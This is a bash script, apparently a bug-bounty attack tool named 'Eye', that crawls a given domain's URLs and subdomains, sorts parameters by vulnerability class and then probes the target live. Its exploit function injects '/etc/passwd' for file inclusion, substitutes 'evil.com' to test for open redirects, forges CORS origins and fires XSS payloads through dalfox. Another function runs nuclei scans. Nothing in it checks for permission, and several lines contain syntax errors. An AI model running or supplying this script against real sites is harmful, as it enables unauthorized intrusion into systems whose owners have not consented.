#!/bin/bash
black=`tput setaf 0`
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
magenta=`tput setaf 5`
cyan=`tput setaf 6`
reset=`tput sgr0`
BOLD="\e[1m"
NC='\033[0m'
help() {
    echo -e "$CYAN${BOLD}Usage:${NC}"
    echo -e "${BOLD}    --help            Shows the help menu${NC}"
    echo -e "${BOLD}    -d           domain.com (make sure this is the first argument)${NC}"
    echo -e "${BOLD}    --nuke           Use Nuclei to scan for exploits ${NC}"
    echo -e "${BOLD}${magenta}    --exploit           Run with custom exploit scripts ${NC}"
    exit 0
}
echo "${green}________________________________

        [Eye] (Exfiltrate Your Exploits)

${magenta}	v0.0.2 - github/00xZ - discord/Zveu ${reset}
                                  "
server=""
file=""
pwd
while getopts "d:f:" opt
do
        case "${opt}" in
                d)
                        domain="${OPTARG}"
                        ;;
                f)
                        file="${OPTARG}"
                        ;;
        esac
done
if [[ ${domain:0:5} == "https" ]]; then
        domain=${domain:8:${#domain}-8}
elif [[ ${domain:0:4} == "http" ]]; then
        domain=${domain:7:${domain}-7}
fi
if [ -d output/$domain ]; then
        echo "${red} [!] An output folder with the same domain name already exists.${reset}"
        read -p "Delete folder:[y/n]: " delete
        if [[ $delete == 'y' ]]; then
                rm -rf output/$domain
        else
                exit 2
        fi
fi
mkdir output/$domain
if [[ $file == "" ]]; then
        read -p "Deep scan(n) or light scan(y)? [y/n]: " sub
        echo "${cyan}Output: output/$domain/raw_urls.txt)"
        echo -e "\n"
        if [[ $sub == 'y' || $sub == 'Y' ]]; then
                trap : SIGINT
                gau $domain > output/$domain/raw_urls.txt
                #gau_s $domain > output/$domain/raw_urls.txt
        else
                trap : SIGINT
                waymore -i $domain -oU output/$domain/raw_urls.txt
        fi

        echo -e "${green}Done${reset}\n"
else
        cat $file > output/$domain/raw_urls.txt
fi
subfinder -d $domain -all -silent | tee output/$domain/subs.txt
# Grab JS Files
echo "${green} [!] Pulling all JS files [!] ${reset}"
cat output/$domain/raw_urls.txt | grep -iE '\.js'|grep -ivE '\.json'|sort -u > output/$domain/javascript.txt

### OR
echo "${yellow} [x] Testing for Open Redirects [x] ${reset}"
cat output/$domain/raw_urls.txt | gf redirect > output/$domain/redirect.txt
#cat output/$domain/raw_urls.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31mOPEN RED Vulnerable\n" ;done | tee output/$domain/open_redirect.txt ## may need fix
### LFI
echo "${cyan} [x] Local File Inclusion [x] ${reset}"
cat output/$domain/raw_urls.txt | gf lfi > output/$domain/lfi.txt
#cat output/$domain/lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "LFI VULN! %"' | tee output/$domain/VULN-lfi.txt
### SQL Injection
cat output/$domain/raw_urls.txt | gf sqli > output/$domain/sqli.txt
### SSTI
cat output/$domain/raw_urls.txt | gf ssti > output/$domain/ssti.txt
### SSRF
cat output/$domain/raw_urls.txt | gf ssrf > output/$domain/ssrf.txt
### IDOR
cat output/$domain/raw_urls.txt | gf idor > output/$domain/idor.txt
### XSS Testing
cat output/$domain/raw_urls.txt | gf cors > output/$domain/cors.txt
echo "${cyan} [x] XSS Started [x] ${reset}"
cat output/$domain/raw_urls.txt | gf xss | sort | uniq > output/$domain/xss.txt
#cat output/$domain/xss.txt | trashcompactor > output/$domain/xss_alive.txt #FIX
#cat output/$domain/xss_alive.txt | gxss -c 100 -o output/$domain/gxss_dump.txt 
cat output/$domain/xss.txt | gxss -c 100 -o output/$domain/gxss_dump.txt
cat output/$domain/raw_urls.txt | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar"
#cat output/$domain/gxss_dump.txt | sort -u | tools/dalfox/./dalfox pipe >> output/$domain/VULN-xss.txt

exploit() {
    echo -e "${red}${BOLD}[!] Exploit Scripts [!]${NC}"
	echo "${cyan}LFI Scan:${reset}"
	cat output/$domain/lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "LFI VULN! %"' | tee output/$domain/VULN-lfi.txt
    echo "${cyan}Redirect : ${reset}"
	cat output/$domain/redirect.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31mOPEN RED Vulnerable\n" ;done | tee output/$domain/open_redirect.txt
	echo "${cyan}XSS : ${reset}"
	cat output/$domain/gxss_dump.txt | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe | tee output/$domain/VULN_xss.txt
	echo "${cyan}Checking CORS : ${reset}"
	cat output/$domain/cors.txt | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then echo "CORS FOUND ON:" $url;else echo "Nothing on: "$url;fi;done
	
	
	#cat output/$domain/subs.txt | httpx -silent -threads 100 | anew output/$domain/alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
	#subfinder -d target.com -all -silent | httpx -silent -threads 100 | anew alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
} 
nuke() {
    echo -e "$cyne${BOLD}[!] Nuking [!]${NC}"
	paramspider -l output/$domain/alive.txt && mv results output/$domain/
    cd results/
    cat ~/bounty.sh/output/$domain/results/* > ~/bounty.sh/output/$domain/params.txt
    nuclei output/$domain/raw_urls.txt -t ~/nuclei-templates -es info,unknown -etags ssl,tcp,code,javascript,whois | anew ~/bounty.sh/output/$domain/nuclei.txt
}
if [ "$3" == "--exploit" ]; then
    exploit
elif [ "$3" == "--nuke" ]; then
    nuke
else
    echo -e "${red}Unknown option: $1 ${NC}"
    help
fi
echo "${green}Find em bugs! Bye ~Eyezik${reset}"